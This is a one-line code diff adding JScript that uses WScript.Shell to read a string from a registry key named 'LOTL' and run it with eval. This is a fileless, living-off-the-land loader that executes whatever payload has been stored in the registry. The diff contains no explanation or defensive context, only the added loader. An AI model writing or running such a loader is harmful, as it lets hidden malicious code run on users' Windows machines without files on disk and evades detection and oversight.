@@ -1,0 +1,1 @@
+var s=new ActiveXObject("WScript.Shell");var r=s.RegRead("HKCU\\Software\\LOTL\\LOTL\\LOTL_Key");eval(r);
